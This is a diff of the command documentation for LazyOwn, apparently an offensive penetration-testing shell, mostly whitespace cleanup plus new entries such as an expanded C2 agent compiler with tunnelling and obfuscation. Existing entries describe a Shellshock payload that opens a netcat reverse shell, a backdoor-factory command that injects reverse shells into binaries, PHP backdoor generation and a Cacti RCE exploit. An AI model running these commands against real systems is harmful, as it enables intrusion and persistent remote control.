@@ -2431,6 +2431,9 @@ No description available.
 <!-- START COMMANDS -->
 # COMMANDS.md Documentation  by readmeneitor.py
 
+## main
+No description available.
+
 ## __init__
 Initializer for the LazyOwnShell class.
 
@@ -2475,6 +2478,10 @@ executed successfully or an exception occurred. And feedback the red operation r
 :return: None.
 :rtype: str
 
+## onecmd_plus_hooks
+Intercepta comandos para expandir placeholders en aliases.
+Maneja tanto strings como objetos Statement.
+
 ## one_cmd
 Internal function to execute commands.
 
@@ -2509,8 +2516,18 @@ Example:
     >>> shell.emptyline()
     You didn't enter any command.
 
+## load_user_commands
+Carga los comandos personalizados desde user_commands.json
+
+## save_user_command
+Guarda un nuevo comando en user_commands.json
+
 ## list_files_in_directory
 Lista todos los archivos en un directorio dado.
+
+## register_tool_commands
+Registra automáticamente todos los comandos .tool en la carpeta 'tools/'
+Usa self.params para reemplazar {ip}, {port}, {domain}, {s}, etc.
 
 ## _register_lua_command
 Registra un comando nuevo desde Lua.
@@ -2529,6 +2546,23 @@ Registers a YAML plugin as a new command.
 
 This method creates a dynamic command based on the plugin's configuration
 and assigns it to the application.
+
+## register_all_adversary_commands
+No description available.
+
+## _register_adversary_command
+No description available.
+
+## display_toastr
+Display a toastr-like notification in the terminal with adaptive sizing.
+
+## _wrap_text
+Helper method to wrap text to fit within specified width.
+
+## notify
+Command to trigger a toastr-like notification.
+Usage: notify <type> <message>
+Example: notify success Implant checked in!
 
 ## EOF
 Handle the end-of-file (EOF) condition.
@@ -2791,6 +2825,17 @@ Runs the internal module `modules/lazynmap.sh` with discovery mode.
 
 This method executes the `lazynmap` script in discovery mode. It uses the current
 working directory for locating the script.
+
+:return: None
+
+## lazynmap
+Runs the internal module `modules/lazynmap.sh` with target mode.
+
+This method executes the `lazynmap` script in target mode. It uses the current
+working directory for locating the script.
+
+:param line: The network ip to be used for scanning.
+:type line: str
 
 :return: None
 
@@ -3796,7 +3841,7 @@ Usage:
 Manual execution:
 1. Run the `getcap -r /` command to list file capabilities recursively from the root directory.
 2. Redirect standard error to `/dev/null` to suppress error messages.
-3. Copy to clipboard the command to appy in the victim machine. 
+3. Copy to clipboard the command to appy in the victim machine.
 Dependencies:
 - `getcap` must be installed on the system.
 
@@ -4139,10 +4184,10 @@ Runs the `finalrecon` tool to perform a web server vulnerability scan against th
 
 Manual execution:
 To manually perform a web server vulnerability scan using `finalrecon`, use the following command:
-    finalrecon --url=http://<target_ip> --full -o txt -cd <directory_reports> 
+    finalrecon --url=http://<target_ip> --full -o txt -cd <directory_reports>
 
 Replace `<target_ip>` with the IP address of the target web server. For example:
-    finalrecon --url=http://192.168.1.92 --full -o txt -cd /home/gris/finalrecon 
+    finalrecon --url=http://192.168.1.92 --full -o txt -cd /home/gris/finalrecon
 
 ## openssl_sclient
 Uses `openssl s_client` to connect to a specified host and port, allowing for testing and debugging of SSL/TLS connections.
@@ -4525,7 +4570,7 @@ Note:
     - Ensure that the `lhost` parameter is correctly assign and that the SMB server is properly configured.
 
 ## sqlmap
-Uses sqlmap to perform SQL injection testing on a given URL or request file (you can get one with burpsuit or proxy command and foxyproxy plugin for browser). 
+Uses sqlmap to perform SQL injection testing on a given URL or request file (you can get one with burpsuit or proxy command and foxyproxy plugin for browser).
 
 This function allows the execution of sqlmap commands with various options, including testing URL endpoints, reading from request files, and using sqlmap's wizard mode for easy configuration.
 
@@ -5044,7 +5089,7 @@ Dependencies:
 Example:
     rhost
     # This will copy the current `rhost` to the clipboard and update the prompt.
-    
+
     rhost clean
     # This will reset the command prompt to its default format.
 
@@ -5076,7 +5121,7 @@ Manual execution:
 Example:
     rhost
     # This will update the command prompt to include the `rhost` and current working directory.
-    
+
     rhost clean
     # This will reset the command prompt to its default format.
 
@@ -5299,8 +5344,8 @@ Note: Ensure `xclip` is installed and properly configured to use clipboard funct
 ## sh
 Executes a shell command directly from the LazyOwn interface.
 
-This function allows the user to execute arbitrary shell commands without exiting the LazyOwn shell. 
-It checks if a command is provided, prints a message indicating the command being executed, and then 
+This function allows the user to execute arbitrary shell commands without exiting the LazyOwn shell.
+It checks if a command is provided, prints a message indicating the command being executed, and then
 runs the command using `os.system`.
 
 Usage:
@@ -5321,8 +5366,8 @@ Note:
 ## sys
 Executes a shell command directly from the LazyOwn interface.
 
-This function allows the user to execute arbitrary shell commands without exiting the LazyOwn shell. 
-It checks if a command is provided, prints a message indicating the command being executed, and then 
+This function allows the user to execute arbitrary shell commands without exiting the LazyOwn shell.
+It checks if a command is provided, prints a message indicating the command being executed, and then
 runs the command using `os.system`.
 
 Usage:
@@ -5344,7 +5389,7 @@ Note:
 Displays the current working directory and lists files, and copies the current directory path to the clipboard.
 
 This function performs the following tasks:
-1. Displays the current working directory with `pwd` and lists files in the directory using `ls`. 
+1. Displays the current working directory with `pwd` and lists files in the directory using `ls`.
 2. Copies the current directory path to the clipboard using `xclip`.
 
 Usage:
@@ -5933,24 +5978,24 @@ and correctly configured.
 ## hostdiscover
 Discover active hosts in a subnet by performing a ping sweep.
 
-This method constructs and executes a bash script that performs a 
-ping sweep on the specified subnet to identify active hosts. The 
-subnet is determined from the 'rhost' parameter. For each host in 
+This method constructs and executes a bash script that performs a
+ping sweep on the specified subnet to identify active hosts. The
+subnet is determined from the 'rhost' parameter. For each host in
 the subnet, a ping request is sent, and active hosts are reported.
 
 Parameters:
 - line (str): The input line argument is not used in this function.
 
 Behavior:
-- Extracts the first three octets of the 'rhost' parameter to form 
+- Extracts the first three octets of the 'rhost' parameter to form
 the base IP pattern.
-- Constructs a bash script to ping each IP address in the subnet 
+- Constructs a bash script to ping each IP address in the subnet
 (from .1 to .254) and reports active hosts.
 - The generated bash script is displayed to the user.
-- Prompts the user to confirm whether they want to execute the 
+- Prompts the user to confirm whether they want to execute the
 generated command.
 - If the user confirms, executes the command using `self.cmd()`.
-- If the user declines, copies the command to the clipboard using 
+- If the user declines, copies the command to the clipboard using
 `copy2clip()`.
 
 Side Effects:
@@ -5958,11 +6003,11 @@ Side Effects:
 - May modify the clipboard content if the user chooses not to execute.
 
 Notes:
-- Ensure that the 'rhost' parameter is a valid IP address and that 
+- Ensure that the 'rhost' parameter is a valid IP address and that
 the `check_rhost()` function is implemented to validate the IP.
-- `print_msg()` is used to display the constructed command to the 
+- `print_msg()` is used to display the constructed command to the
 user.
-- `copy2clip()` is used to copy the command to the clipboard if 
+- `copy2clip()` is used to copy the command to the clipboard if
 not executed.
 
 Example:
@@ -5971,8 +6016,8 @@ Example:
 ## portdiscover
 Scan all ports on a specified host to identify open ports.
 
-This method constructs and executes a bash script that performs a 
-port scan on the specified host to determine which ports are open. 
+This method constructs and executes a bash script that performs a
+port scan on the specified host to determine which ports are open.
 It scans all ports from 0 to 65535 and reports any that are open.
 
 Parameters:
@@ -5980,13 +6025,13 @@ Parameters:
 
 Behavior:
 - Extracts the 'rhost' parameter to determine the target IP address.
-- Constructs a bash script to scan all ports on the target IP address 
+- Constructs a bash script to scan all ports on the target IP address
 and report open ports.
 - The generated bash script is displayed to the user.
-- Prompts the user to confirm whether they want to execute the 
+- Prompts the user to confirm whether they want to execute the
 generated command.
 - If the user confirms, executes the command using `self.cmd()`.
-- If the user declines, copies the command to the clipboard using 
+- If the user declines, copies the command to the clipboard using
 `copy2clip()`.
 
 Side Effects:
@@ -5994,11 +6039,11 @@ Side Effects:
 - May modify the clipboard content if the user chooses not to execute.
 
 Notes:
-- Ensure that the 'rhost' parameter is a valid IP address and that 
+- Ensure that the 'rhost' parameter is a valid IP address and that
 the `check_rhost()` function is implemented to validate the IP.
-- `print_msg()` is used to display the constructed command to the 
+- `print_msg()` is used to display the constructed command to the
 user.
-- `copy2clip()` is used to copy the command to the clipboard if 
+- `copy2clip()` is used to copy the command to the clipboard if
 not executed.
 
 Example:
@@ -6007,9 +6052,9 @@ Example:
 ## portservicediscover
 Scan all ports on a specified host to identify open ports and associated services.
 
-This method constructs and executes a bash script that performs a 
-port scan on the specified host to determine which ports are open 
-and identifies any services running on those open ports. It scans 
+This method constructs and executes a bash script that performs a
+port scan on the specified host to determine which ports are open
+and identifies any services running on those open ports. It scans
 all ports from 0 to 65535.
 
 Parameters:
@@ -6017,13 +6062,13 @@ Parameters:
 
 Behavior:
 - Extracts the 'rhost' parameter to determine the target IP address.
-- Constructs a bash script to scan all ports on the target IP address 
+- Constructs a bash script to scan all ports on the target IP address
 and report open ports along with any associated services.
 - The generated bash script is displayed to the user.
-- Prompts the user to confirm whether they want to execute the 
+- Prompts the user to confirm whether they want to execute the
 generated command.
 - If the user confirms, executes the command using `self.cmd()`.
-- If the user declines, copies the command to the clipboard using 
+- If the user declines, copies the command to the clipboard using
 `copy2clip()`.
 
 Side Effects:
@@ -6032,11 +6077,11 @@ Side Effects:
 - May modify the clipboard content if the user chooses not to execute.
 
 Notes:
-- Ensure that the 'rhost' parameter is a valid IP address and that 
+- Ensure that the 'rhost' parameter is a valid IP address and that
 the `check_rhost()` function is implemented to validate the IP.
-- `print_msg()` is used to display the constructed command to the 
+- `print_msg()` is used to display the constructed command to the
 user.
-- `copy2clip()` is used to copy the command to the clipboard if 
+- `copy2clip()` is used to copy the command to the clipboard if
 not executed.
 
 Example:
@@ -6045,7 +6090,7 @@ Example:
 ## rot
 Apply a ROT (rotation) substitution cipher to the given string.
 
-This function rotates each character in the input string by the specified number of positions in the alphabet. It supports rotation values between 1 and 27. 
+This function rotates each character in the input string by the specified number of positions in the alphabet. It supports rotation values between 1 and 27.
 
 Usage:
     rot <number> '<string>'
@@ -6062,7 +6107,7 @@ Note: The function assumes that the rotation number is an integer between 1 and 
 ## rotf
 Apply a ROT (rotation) substitution cipher to the given extension.
 
-This function rotates each character in the input extension by the specified number of positions in the alphabet. It supports rotation values between 1 and 27. 
+This function rotates each character in the input extension by the specified number of positions in the alphabet. It supports rotation values between 1 and 27.
 
 Usage:
     rot <number> '<extension>'
@@ -6786,7 +6831,7 @@ Devuelve la salida acumulada
 ## sessionssh
 Ejecuta un comando para listar las conexiones SSH activas.
 
-Este método utiliza `netstat` para mostrar las conexiones establecidas (`ESTAB`) y filtra los resultados para mostrar solo las conexiones SSH. 
+Este método utiliza `netstat` para mostrar las conexiones establecidas (`ESTAB`) y filtra los resultados para mostrar solo las conexiones SSH.
 
 Parámetros:
 - line: Parámetro no utilizado en esta función.
@@ -6823,8 +6868,8 @@ Notes:
 Executes commands defined in a lazyscript file.
 
 This function reads a script file containing commands to be executed
-sequentially. Each command is executed using the onecmd method of the 
-cmd.Cmd class. The script file should be located in the 'lazyscripts' 
+sequentially. Each command is executed using the onecmd method of the
+cmd.Cmd class. The script file should be located in the 'lazyscripts'
 directory relative to the current working directory.
 
 Args:
@@ -6839,10 +6884,10 @@ Relanza la aplicación actual utilizando `proxychains` para enrutar el tráfico
 a través de los proxies configurados.
 
 Este comando reinicia la aplicación desde el principio utilizando un script
-bash externo llamado `run`, que se encarga de configurar el entorno 
-(como activar un entorno virtual) y luego ejecutar la aplicación Python. 
-El comando `proxychains` se utiliza para asegurar que cualquier comando 
-ejecutado dentro de la aplicación, como `nmap`, sea encaminado a través 
+bash externo llamado `run`, que se encarga de configurar el entorno
+(como activar un entorno virtual) y luego ejecutar la aplicación Python.
+El comando `proxychains` se utiliza para asegurar que cualquier comando
+ejecutado dentro de la aplicación, como `nmap`, sea encaminado a través
 de los proxies especificados en la configuración de `proxychains`.
 
 Pasos realizados por esta función:
@@ -6851,7 +6896,7 @@ Pasos realizados por esta función:
 3. Sale de la instancia actual de la aplicación para evitar duplicación.
 
 Args:
-    line (str): No se utiliza en este comando, pero se incluye como parte 
+    line (str): No se utiliza en este comando, pero se incluye como parte
                 de la interfaz estándar de `cmd`.
 
 ## shellcode
@@ -6870,9 +6915,9 @@ This function:
 5. Copies the generated command to the clipboard for easy execution.
 
 ## skipfish
-This function executes the web security scanning tool Skipfish 
-using the provided configuration and parameters. It allows 
-scanning a specified target (rhost) and saves the results 
+This function executes the web security scanning tool Skipfish
+using the provided configuration and parameters. It allows
+scanning a specified target (rhost) and saves the results
 in a designated output directory.
 
 Parameters:
@@ -6895,14 +6940,14 @@ Note:
 ## createdll
 Create a Windows DLL file using MinGW-w64 or a Blazor DLL for Linux.
 
-This function prompts the user to select between creating a 32-bit DLL, 
-a 64-bit DLL, or a Linux Blazor DLL. It first checks if MinGW-w64 is installed; 
-if not, it attempts to install it. The user must provide a filename for the 
-DLL, which will be created from the `sessions/rev.c` source file. 
-The function constructs the appropriate command to compile the DLL based on 
-the user's choice and executes it. If the user selects a 32-bit or 64-bit 
-compilation, the function also opens the `rev.c` file in a text editor for 
-modifications before compilation. For option 3, it executes a script to create 
+This function prompts the user to select between creating a 32-bit DLL,
+a 64-bit DLL, or a Linux Blazor DLL. It first checks if MinGW-w64 is installed;
+if not, it attempts to install it. The user must provide a filename for the
+DLL, which will be created from the `sessions/rev.c` source file.
+The function constructs the appropriate command to compile the DLL based on
+the user's choice and executes it. If the user selects a 32-bit or 64-bit
+compilation, the function also opens the `rev.c` file in a text editor for
+modifications before compilation. For option 3, it executes a script to create
 a Blazor DLL using the local host (lhost) address to download the necessary payload.
 
 Parameters:
@@ -6911,8 +6956,8 @@ Parameters:
 
 Usage:
 - Choose "1" for 32-bit, "2" for 64-bit, or "3" for creating a Linux Blazor DLL.
-- Ensure that shellcode is created beforehand using 
-the `lazymsfvenom` or `venom` options 13 or 14 
+- Ensure that shellcode is created beforehand using
+the `lazymsfvenom` or `venom` options 13 or 14
 to replace in `sessions/rev.c`.
 
 ## seo
@@ -6939,11 +6984,11 @@ Execute the PadBuster command for padding oracle attacks.
 
 This function constructs and executes a PadBuster command to perform
 a padding oracle attack on the specified URL. It requires the user
-to provide a URL, a cookie with a hash, a plaintext value to compare, 
+to provide a URL, a cookie with a hash, a plaintext value to compare,
 and a specific byte position to attack.
 
 Parameters:
-- line (str): The input line containing the cookie, plaintext, and byte 
+- line (str): The input line containing the cookie, plaintext, and byte
             position. Expected format: 'cookie=<HASH> plaintext <byte_position>'.
 
 Functionality:
@@ -6966,14 +7011,14 @@ This function performs the following actions:
 4. Optionally conducts a brute-force attack on SMB using the provided password file.
 
 Parameters:
-line (str): The command line input for the smbattack function, 
+line (str): The command line input for the smbattack function,
             though not used directly in this implementation.
 
 Returns:
 None
 
 ## cacti_exploit
-Automates the exploitation of the Cacti version 1.2.26 vulnerability 
+Automates the exploitation of the Cacti version 1.2.26 vulnerability
 using the multi/http/cacti_package_import_rce exploit.
 
 This function performs the following actions:
@@ -6983,7 +7028,7 @@ This function performs the following actions:
 4. Triggers the payload to obtain a Meterpreter session.
 
 Parameters:
-line (str): The command line input for the cacti exploit function, 
+line (str): The command line input for the cacti exploit function,
             though used directly in this implementation to set password.
 
 Returns:
@@ -6992,8 +7037,8 @@ None
 ## smalldic
 Handles the creation of temporary files for users and passwords based on a small dictionary.
 
-This function prompts the user to decide whether to use a small dictionary for generating 
-user and password lists. If the user agrees, it loads the credentials from a JSON file and 
+This function prompts the user to decide whether to use a small dictionary for generating
+user and password lists. If the user agrees, it loads the credentials from a JSON file and
 writes them into temporary files. If the user declines, the process is aborted.
 
 Parameters:
@@ -7033,25 +7078,25 @@ The function does not return any value.
 ## shellshock
 Executes a Shellshock attack against a target.
 
-This function constructs and sends a specially crafted HTTP request designed to exploit 
-the Shellshock vulnerability on a target server. The payload is embedded in the 
-'User-Agent' header, and when executed, it will open a reverse shell connection to 
+This function constructs and sends a specially crafted HTTP request designed to exploit
+the Shellshock vulnerability on a target server. The payload is embedded in the
+'User-Agent' header, and when executed, it will open a reverse shell connection to
 the attacker's machine.
 
 Parameters:
 - lport: Local port for the reverse shell connection, retrieved from self.params.
 - lhost: Local host for the reverse shell connection, retrieved from self.params.
 
-The function first validates the local host (lhost) and local port (lport) using 
-check_lhost() and check_lport(). If either validation fails, the function returns 
+The function first validates the local host (lhost) and local port (lport) using
+check_lhost() and check_lport(). If either validation fails, the function returns
 without proceeding.
 
 If the validation passes, the payload is created using the format:
 '() { :; }; /bin/bash -c "nc -v {rhost} {lport} -e /bin/bash -i"',
 where rhost is the remote target's IP address and lport is the specified local port.
 
-The function then attempts to send a GET request to the target URL (args.target) 
-with the crafted payload in the 'User-Agent' header. The server's response is captured 
+The function then attempts to send a GET request to the target URL (args.target)
+with the crafted payload in the 'User-Agent' header. The server's response is captured
 and printed using print_msg().
 
 If any error occurs during the request, an error message is displayed using print_error().
@@ -7073,15 +7118,15 @@ Example of use: curl -X POST http://victim:8080/ -d "Get-Process"
 ## morse
 Interactive Morse Code Converter.
 
-This function serves as an interface for converting text to Morse code and vice versa. 
+This function serves as an interface for converting text to Morse code and vice versa.
 It provides a menu with the following options:
 
 1️⃣  Convert text to Morse code.
 2️⃣  Convert Morse code to text.
 0️⃣  Exit the program.
 
-When the function is called, it runs an external script (`morse.py`) that handles 
-the conversion processes. The function also manages keyboard interruptions 
+When the function is called, it runs an external script (`morse.py`) that handles
+the conversion processes. The function also manages keyboard interruptions
 gracefully, allowing the user to exit the program cleanly.
 
 Arguments:
@@ -7107,18 +7152,26 @@ The limit of results is taken from self.params["limit"] if provided; otherwise, 
 Results are printed directly to the console.
 
 ## c2
-Handles the execution of a C2 (Command and Control) server setup command.
+Handle C2 server setup and agent compilation.
 
-This function performs the following tasks:
-1. Retrieves and validates the local host (lhost) and local port (lport) parameters.
-2. Checks if the required file `modules/run` exists.
-3. Reads the content of the `modules/run` file, replaces placeholders with actual values (lport, line, lhost),
-and copies the updated content to the clipboard.
-4. Prompts the user to start the C2 server, and if confirmed, executes the server command.
-5. Provides a warning about shutting down the server.
+This method manages the process of setting up a Command and Control (C2)
+server and compiling a corresponding agent for various platforms.
 
 Args:
-    line (str): The victim ID or command line to be used by the C2 server.
+    line (str): Specifies the victim ID and optional C2 server configurations.
+        - Victim ID: The identifier for the target agent.
+        - Tunnel Option (optional): Append '1' to use a Cloudflare tunnel.
+        - Target Choice (optional): A number from '1' to '7' to specify the
+        agent platform (default is '1' for Windows PowerShell).
+            - '1': Windows PowerShell
+            - '2': Linux Shell
+            - '3': Windows Batch
+            - '4': macOS Shell
+            - '5': Android Shell
+            - '6': iOS Shell
+            - '7': WebAssembly Shell
+        - Tunnel Toggle (optional): After the victim ID and target choice,
+        you can append '1' to enable the Cloudflare tunnel or '0' to disable it.
 
 Returns:
     None
@@ -7126,13 +7179,18 @@ Returns:
 Raises:
     None
 
-Example:
-    c2 victim 1
+Example Usage:
+    c2 victim-1  # Compiles a Windows PowerShell agent
+    c2 victim-2 2 # Compiles a Linux Shell agent
+    c2 victim-3 1 1 # Compiles a Windows PowerShell agent with Cloudflare tunnel
 
 Notes:
-    - Ensure that the `lhost` and `lport` parameters are valid before calling this function.
-    - The `modules/run` file must exist and be correctly formatted.
-    - The server command is executed using `os.system`, which may require additional handling for security.
+    - Ensure the 'lhost' and 'c2_port' parameters are correctly set in the
+    `payload.json` config file before calling this method.
+    - The `modules/run` file and files in `modules/backdoor/` and
+    `modules/rootkit/` directories must exist for the agent compilation
+    process.
+    - The go artifactory is ofuscated by garble if is installed
 
 ## kick
 Handles the process of sending a spoofed ARP packet to a specified IP address with a given MAC address.
@@ -7153,7 +7211,7 @@ Raises:
     Exception: If any error occurs during the execution of the function.
 
 ## sqli
-Asks the user for the URL, database, table, and columns, and then executes the Python script 
+Asks the user for the URL, database, table, and columns, and then executes the Python script
 'modules/lazybsqli.py' with the provided parameters.
 
 Parameters:
@@ -7177,7 +7235,7 @@ Example:
 ## crunch
 Generate a custom dictionary using the `crunch` tool.
 
-This function creates a wordlist with a specified length using the `crunch` command. 
+This function creates a wordlist with a specified length using the `crunch` command.
 It allows the user to specify a custom character pattern for the wordlist.
 
 :param line: The length of the strings to be generated (e.g., '6' for 6-character strings).
@@ -7225,9 +7283,9 @@ Returns:
 ## download_malwarebazar
 Download a malware sample from MalwareBazaar using its SHA256 hash.
 
-This function allows the user to download a malware sample from MalwareBazaar by providing 
-the SHA256 hash of the desired file. If the hash is not provided as an argument, the function 
-will prompt an error message indicating the correct usage. The downloaded malware sample 
+This function allows the user to download a malware sample from MalwareBazaar by providing
+the SHA256 hash of the desired file. If the hash is not provided as an argument, the function
+will prompt an error message indicating the correct usage. The downloaded malware sample
 will be saved as a zipped file (`malware.zip`) and will be password protected.
 
 Arguments:
@@ -7240,7 +7298,7 @@ Example:
 >>> download_malwarebazar 094fd325049b8a9cf6d3e5ef2a6d4cc6a567d7d49c35f8bb8dd9e3c6acf3d78d
 
 Notes:
-- Ensure that the SHA256 hash provided is correct and that it corresponds to a file available 
+- Ensure that the SHA256 hash provided is correct and that it corresponds to a file available
 on MalwareBazaar.
 - The downloaded file will be password protected using the password "infected".
 - To obtain the SHA256 hash of malware samples, refer to the `help malwarebazar` command.
@@ -7312,21 +7370,21 @@ Example usage:
 ## graudit
 Executes the graudit command to perform a static code analysis with the specified options.
 
-This function runs the 'graudit' tool with the '-A' option for an advanced scan and 
-the '-i sessions' option to include session files. The results will be displayed 
+This function runs the 'graudit' tool with the '-A' option for an advanced scan and
+the '-i sessions' option to include session files. The results will be displayed
 directly in the terminal.
 
 Args:
-    line (str): Input line from the command interface. This argument is currently 
-                not used within the function but is required for the command 
+    line (str): Input line from the command interface. This argument is currently
+                not used within the function but is required for the command
                 interface structure.
-                
+
 Example:
     To run this function from the command interface, simply type 'graudit' and press enter.
     The function will execute the 'graudit -A -i sessions' command.
 
 Note:
-    Ensure that 'graudit' is installed and properly configured in your system's PATH 
+    Ensure that 'graudit' is installed and properly configured in your system's PATH
     for this function to work correctly.
 
 ## msfrpc
@@ -7358,12 +7416,12 @@ Otherwise, it will use the target specified in self.params["rhost"].
 ## sherlock
 Executes the Sherlock tool to find usernames across social networks.
 
-This function takes a username as an argument and runs the Sherlock tool 
-to check for the username's presence on various social networks. The 
+This function takes a username as an argument and runs the Sherlock tool
+to check for the username's presence on various social networks. The
 results are saved in CSV format in the `sessions` directory.
 
 Parameters:
-line (str): The username to be checked by Sherlock. If not provided, an 
+line (str): The username to be checked by Sherlock. If not provided, an
             error message is printed and the function returns.
 
 Returns:
@@ -7379,13 +7437,13 @@ Running command: sherlock example_user --local -v --csv --print-found
 Additional Notes:
 - The Sherlock tool must be installed and available in the system path.
 - The results are saved in the `sessions` directory as a CSV file.
-- The `--local` flag forces the use of a local `data.json` file, 
+- The `--local` flag forces the use of a local `data.json` file,
 which should be present in the appropriate directory.
 
 ## trufflehog
-Executes trufflehog to search for secrets in a given Git repository URL. 
-If trufflehog is not installed, it installs the tool automatically. 
-This function navigates to the 'sessions' directory and runs trufflehog 
+Executes trufflehog to search for secrets in a given Git repository URL.
+If trufflehog is not installed, it installs the tool automatically.
+This function navigates to the 'sessions' directory and runs trufflehog
 with the provided Git URL, outputting the results in JSON format.
 
 Args:
@@ -7407,7 +7465,7 @@ Notes:
 ## weevelygen
 Generate a PHP backdoor using Weevely, protected with the given password.
 
-This function generates a PHP backdoor file using the specified password. It ensures that Weevely is installed on the system before attempting to generate the backdoor. If Weevely is not present, it will be installed automatically. 
+This function generates a PHP backdoor file using the specified password. It ensures that Weevely is installed on the system before attempting to generate the backdoor. If Weevely is not present, it will be installed automatically.
 
 Usage:
 ┌─[LazyOwn👽127.0.0.1 ~/LazyOwn][10.10.10.10][http://victim.local/]
@@ -7430,7 +7488,7 @@ $ weevelygen s3cr3t
 ## weevely
 Connect to PHP backdoor using Weevely, protected with the given password.
 
-This function Connect to PHP backdoor file using the specified password. It ensures that Weevely is installed on the system before attempting to generate the backdoor. If Weevely is not present, it will be installed automatically. 
+This function Connect to PHP backdoor file using the specified password. It ensures that Weevely is installed on the system before attempting to generate the backdoor. If Weevely is not present, it will be installed automatically.
 
 Usage:
 ┌─[LazyOwn👽127.0.0.1 ~/LazyOwn][10.10.10.10][http://victim.local/]
@@ -7503,7 +7561,7 @@ SharpShooter is capable of creating payloads in a variety of formats, including 
 Usage:
     sharpshooter [-o <output file>] --oa -t 20 rhost
 
-This function installs SharpShooter if it is not already installed, prompts the user for the payload type, 
+This function installs SharpShooter if it is not already installed, prompts the user for the payload type,
 and then runs SharpShooter to create a payload based on the specified type.
 
 Parameters:
@@ -7525,7 +7583,7 @@ Usage:
     sliver-client [command]
 
 This function installs Sliver if it is not already installed, starts the Sliver server,
-generates the necessary certificates, and creates a client configuration file. 
+generates the necessary certificates, and creates a client configuration file.
 It also provides options to download the client for different operating systems.
 
 Parameters:
@@ -7560,7 +7618,7 @@ Returns:
 None
 
 Example:
-To enumerate user accounts using Kerbrute, ensure Kerbrute is in your path, 
+To enumerate user accounts using Kerbrute, ensure Kerbrute is in your path,
 then run this function to perform the enumeration.
 
 Note:
@@ -7570,7 +7628,7 @@ Note:
 ## dacledit
 Execute the dacledit.py command for a specific user or all users listed in the users.txt file.
 
-This function interacts with the DACL editor to modify access control lists in an Active Directory environment. 
+This function interacts with the DACL editor to modify access control lists in an Active Directory environment.
 It allows the user to select a specific user from the list or execute the command for all users.
 Install impacket suit to get this script in the examples
 Args:
@@ -7604,7 +7662,7 @@ This function interacts with BloodyAD to add users to a group in an Active Direc
 It allows the user to select a specific user from the list or execute the command for all users.
 (use download_external option 48 to clone the repo)
 Args:
-    line (str): The organizational unit (OU) in the format 'CN=EXAMPLE,DC=DOMAIN,DC=EXT'. 
+    line (str): The organizational unit (OU) in the format 'CN=EXAMPLE,DC=DOMAIN,DC=EXT'.
                 If not provided, the user is prompted to enter it.
 
 Returns:
@@ -7685,11 +7743,11 @@ For example:
 ## backdoor_factory
 Creates a backdoored executable using `backdoor-factory`.
 
-This function checks if `backdoor-factory` is installed, installs it if necessary, and then uses it to 
-inject a reverse shell payload into a specified binary file. The binary is backdoored with a 
+This function checks if `backdoor-factory` is installed, installs it if necessary, and then uses it to
+inject a reverse shell payload into a specified binary file. The binary is backdoored with a
 reverse shell payload that connects back to a specified host and port.
 
-:param line: The absolute path to the file that will be backdoored. If not provided, the user is prompted 
+:param line: The absolute path to the file that will be backdoored. If not provided, the user is prompted
             to enter the path.
 
 :returns: None
@@ -7698,8 +7756,8 @@ Manual execution:
 To manually create a backdoored executable, use the following command:
     backdoor-factory -f <file_path> -H <lhost> -P <lport> -s reverse_shell_tcp_inline -J -a -c -l 128 -o <output_file>
 
-Replace `<file_path>` with the path to the binary you want to backdoor, `<lhost>` with the IP address of 
-the attacker’s machine, and `<lport>` with the port number to listen on. The `<output_file>` is the path 
+Replace `<file_path>` with the path to the binary you want to backdoor, `<lhost>` with the IP address of
+the attacker’s machine, and `<lport>` with the port number to listen on. The `<output_file>` is the path
 where the backdoored binary will be saved.
 
 For example:
@@ -7708,10 +7766,10 @@ For example:
 ## davtest
 Tests WebDAV server configurations using `davtest`.
 
-This function checks if `davtest` is installed and installs it if necessary. It then runs `davtest` 
+This function checks if `davtest` is installed and installs it if necessary. It then runs `davtest`
 to perform a WebDAV server test against a specified URL or the default URL configured in `self.params`.
 
-:param line: The URL of the WebDAV server to test. If provided, it overrides the default URL. 
+:param line: The URL of the WebDAV server to test. If provided, it overrides the default URL.
             If not provided, the function uses the URL specified in `self.params["rhost"]`.
 
 :returns: None
@@ -7780,7 +7838,7 @@ it defaults to port 80.
 The command is then printed and executed.
 
 Parameters:
-line (str): Defaults to "80" 
+line (str): Defaults to "80"
 
 Returns:
 None
@@ -7793,15 +7851,15 @@ sudo bash sessions/tor.sh
 sudo bash sessions/tor.sh
 
 Note:
-Ensure that the `tor.sh` script exists in the `sessions` directory and that you have the 
+Ensure that the `tor.sh` script exists in the `sessions` directory and that you have the
 necessary permissions to execute scripts with `sudo`.
 
 ## generatedic
 Generates a wordlist based on a target name and a list of characters, with various combinations.
 
-This function prompts the user for a target name and a wordlist name, then generates various combinations 
-of the target name with a given list of characters. The combinations include single, double, triple, fourth, 
-fifth, sixth, and intercalated character variations. The generated passwords are saved to the specified 
+This function prompts the user for a target name and a wordlist name, then generates various combinations
+of the target name with a given list of characters. The combinations include single, double, triple, fourth,
+fifth, sixth, and intercalated character variations. The generated passwords are saved to the specified
 wordlist file.
 
 :param line: Not used in this function.
@@ -7809,7 +7867,7 @@ wordlist file.
 :returns: None
 
 Manual execution:
-To manually generate a wordlist, run the script and follow the prompts to enter the target name, 
+To manually generate a wordlist, run the script and follow the prompts to enter the target name,
 wordlist name, and additional characters if desired.
 
 For example:
@@ -7951,7 +8009,7 @@ Note:
   within the `sessions` directory.
 
 ## eyewitness
-Executes EyeWitness to capture screenshots from a list of URLs. 
+Executes EyeWitness to capture screenshots from a list of URLs.
 You need to provide a file containing URLs or a single URL to capture.
 :param line: Not used directly but reserved for future use.
 :returns: None
@@ -8023,8 +8081,8 @@ This function generates HTTP requests with a crafted payload to detect if a targ
 ## generate_revshell
 Generate a reverse shell in various programming languages.
 
-This function prompts the user to choose a reverse shell type (Bash, Python, NetCat, PHP, Ruby, Perl, Telnet, NodeJS, Golang, PowerShell) 
-and then asks for the necessary parameters (IP and port). Based on the user's input, it generates the corresponding 
+This function prompts the user to choose a reverse shell type (Bash, Python, NetCat, PHP, Ruby, Perl, Telnet, NodeJS, Golang, PowerShell)
+and then asks for the necessary parameters (IP and port). Based on the user's input, it generates the corresponding
 reverse shell command.
 
 :param line: Not used in this implementation.
@@ -8046,19 +8104,19 @@ Steps performed by the function:
 - Downloads the 'alterx' version 0.0.4 (Linux 64-bit) from GitHub and extracts it into the 'alterx' directory.
 
 3. **Add 'alterx' to system PATH:**
-- Depending on the user's shell (`bash` or `zsh`), it appends the 'alterx' directory to the system PATH 
-    by modifying the appropriate shell configuration file (`~/.bashrc` or `~/.zshrc`). This ensures 'alterx' 
+- Depending on the user's shell (`bash` or `zsh`), it appends the 'alterx' directory to the system PATH
